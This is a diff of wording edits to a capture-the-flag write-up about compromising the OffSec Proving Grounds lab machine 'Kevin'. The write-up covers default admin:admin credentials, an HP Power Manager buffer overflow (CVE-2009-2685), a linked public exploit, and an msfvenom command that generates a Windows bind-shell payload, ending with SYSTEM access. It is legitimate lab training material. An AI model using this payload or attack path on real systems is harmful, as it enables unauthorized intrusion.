@@ -8,12 +8,12 @@ tags: ["CTF","Offsec","Windows", "Easy"]
 skills: ["CVE-2009-2685"]
 ---
 
-In this walkthrough, I demonstrate how I obtained complete ownership of Kevin from OffSec Proving Grounds.
+In this walkthrough, I show how I obtained full access to Kevin from OffSec Proving Grounds.
 
-## Learning Space
+## Learning Objectives
 
 - Python scripting
-- Hewlett-Packard (HP) Power Manager Administration Power Manager Administration - Universal Buffer Overflow (CVE-2009-2685)
+- Hewlett-Packard (HP) Power Manager Administration - Universal Buffer Overflow (CVE-2009-2685)
 
 ## Nmap Scan
 
@@ -127,7 +127,7 @@ Host script results:
 
 ### SMB
 
-Seemed vulnerable to MS17-010 (Eternalblue). Since this could crash the box, we are going to keep searching and leave it for now.
+This appeared to be vulnerable to MS17-010 (Eternalblue). Since exploitation could crash the box, I decided to keep searching and leave it for now.
 
 ### HTTP
 
@@ -135,12 +135,12 @@ Navigating to the web page on port 80, we find **HP Power Manager**.
 
 ![alt text](img/http_login.png)
 
-We are able to log in with pretty insecure credentials: `admin:admin`. This enables us to made further enumeration of the service. We now know we are facing
-**HP Power Manager 4.2 (Build 7)**, which is vulnerable to a Buffer Overflow.
+We can log in with fairly weak credentials: `admin:admin`. This enables us to perform deeper enumeration of the service. We now know we are dealing with
+**HP Power Manager 4.2 (Build 7)**, which is vulnerable to a buffer overflow.
 
 ## Exploit
 
-Searching on a bit, I was able to find [this](https://github.com/Muhammd/HP-Power-Manager) exploit.
+After doing a bit of research, I was able to find [this](https://github.com/Muhammd/HP-Power-Manager) exploit.
 
 Changes made to the exploit:
 - Changed the `msfvenom` payload (`msfvenom -p windows/shell_bind_tcp LHOST=192.168.79.45 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python`)
@@ -166,7 +166,7 @@ nt authority\system
 
 ## Post Exploitation
 
-**Already nt authority\system**
+**We already have nt authority\system**
 
 ## Proofs
 
